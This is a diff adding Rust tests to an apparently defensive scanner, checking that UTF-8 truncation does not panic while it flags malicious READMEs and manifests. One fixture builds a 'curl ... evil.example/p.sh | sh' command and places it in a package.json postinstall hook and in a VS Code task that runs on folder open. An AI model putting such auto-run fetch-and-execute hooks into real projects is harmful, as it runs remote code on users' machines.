@@ -283,4 +283,72 @@ mod tests {
         });
         assert_eq!(decoy.verdict, "malicious");
     }
+
+    #[test]
+    fn high_entropy_multibyte_utf8_token_does_not_panic() {
+        let eng = engine();
+        // 47 ASCII bytes followed by multi-byte UTF-8 characters so byte index 48 splits a scalar.
+        let token = format!(
+            "{}{}",
+            "aZ09!@#qWeRtYuIoP1234567890xCvBnM_+-=~`kLmNpQrS",
+            "가나다라마바사아자차카타파하🚀🔥💎⚡"
+        );
+        assert!(token.len() > 48);
+        assert!(!token.is_char_boundary(48));
+        let md = format!("```powershell\npowershell -c {token}\n```\n");
+        let report = eng.analyze_readme(Some(&md), None, ScanOptions::default());
+        assert!(matches!(report.verdict.as_str(), "clean" | "malicious"));
+        for sig in &report.signals {
+            assert!(sig.detail.is_char_boundary(sig.detail.len()));
+        }
+    }
+
+    #[test]
+    fn manifest_multibyte_utf8_truncation_does_not_panic() {
+        let eng = engine();
+        // Craft a >120-byte malicious command where byte 120 lands inside a 3-byte Hangul char.
+        let cmd = format!(
+            "curl -fsSL https://evil.example/p.sh | sh # {}{}",
+            "a".repeat(75),
+            "한글경계테스트문자열입니다"
+        );
+        assert!(cmd.len() > 120);
+        assert!(!cmd.is_char_boundary(120));
+
+        let pkg_json = serde_json::json!({
+            "name": "utf8-test",
+            "scripts": { "postinstall": cmd }
+        })
+        .to_string();
+        let vscode_tasks = serde_json::json!({
+            "tasks": [{
+                "label": "auto",
+                "command": cmd,
+                "runOptions": { "runOn": "folderOpen" }
+            }]
+        })
+        .to_string();
+
+        // Craft a >max_readme_bytes setup.py where max_readme_bytes splits a 3-byte char.
+        let max_bytes = eng.rules.limits.max_readme_bytes;
+        let prefix = "from setuptools import setup\n";
+        let pad = if (max_bytes - prefix.len()) % 3 == 0 { "#" } else { "" };
+        let big_setup = format!(
+            "{prefix}{pad}{}\n",
+            "가".repeat((max_bytes / 3) + 10)
+        );
+        assert!(big_setup.len() > max_bytes);
+        assert!(!big_setup.is_char_boundary(max_bytes));
+
+        let report = eng.analyze_manifest(&ManifestInput {
+            files: vec![
+                ManifestFile { path: "package.json".into(), content: pkg_json },
+                ManifestFile { path: ".vscode/tasks.json".into(), content: vscode_tasks },
+                ManifestFile { path: "setup.py".into(), content: big_setup },
+            ],
+            tree: vec![],
+        });
+        assert_eq!(report.verdict, "malicious");
+        assert!(report.signals.len() >= 2);
+    }
 }
